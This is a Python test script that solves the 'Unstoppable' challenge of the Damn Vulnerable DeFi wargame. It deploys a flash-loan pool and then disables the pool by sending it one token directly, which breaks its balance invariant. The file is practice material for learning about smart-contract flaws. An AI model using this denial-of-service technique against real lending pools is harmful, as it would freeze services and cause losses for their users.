from scripts.utils import *
from brownie import UnstoppableLender, ReceiverUnstoppable, DamnValuableToken

def test_solve_challenge():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################

    # tokens in pool and initial attacker balance
    TOKENS_IN_POOL = ether_to_wei(1000000)
    INITIAL_ATTACKER_TOKEN_BALANCE = ether_to_wei(100)

    # import accounts
    deployer, _fromDeployer, attacker, _fromAttacker, some_user, _fromSomeUser = define_from_acc(qty=3)

    # deploy the contracts
    token = DamnValuableToken.deploy(_fromDeployer)
    pool = UnstoppableLender.deploy(token.address, _fromDeployer)

    # fund the pool
    token.approve(pool.address, TOKENS_IN_POOL, _fromDeployer)
    pool.depositTokens(TOKENS_IN_POOL, _fromDeployer)
    token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE, _fromDeployer)

    # confirm the balances are correct
    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
    assert token.balanceOf(attacker.address) == INITIAL_ATTACKER_TOKEN_BALANCE

    # test making a flash loan from a random user
    receiver_contract = ReceiverUnstoppable.deploy(pool.address, _fromSomeUser)
    receiver_contract.executeFlashLoan(10, _fromSomeUser)

    # check if solved
    def check_solution():
        ############################################
        ############ SUCCESS CONDITIONS ############
        ############################################

        # It is no longer possible to execute flash loans
        try:     
            receiver_contract.executeFlashLoan(10, _fromSomeUser)
        except:
            assert True
            return
        assert False
        

# ######################################################### 
# There's a lending pool with a million DVT tokens in balance, offering flash loans for free.
#
# If only there was a way to attack and stop the pool from offering flash loans ...
#
# You start with 100 DVT tokens in balance.
# #########################################################

    #############################
    ##### SOLUTION GOES HERE #### 
    #############################

    # transfer some tokens to the attacker contract, which will subsequently send them to the pool to increase balanceBefore so it doesn't match with poolBalance
    token.transfer(pool.address, 1, _fromAttacker)
    
    ######################
    check_solution()
    
    
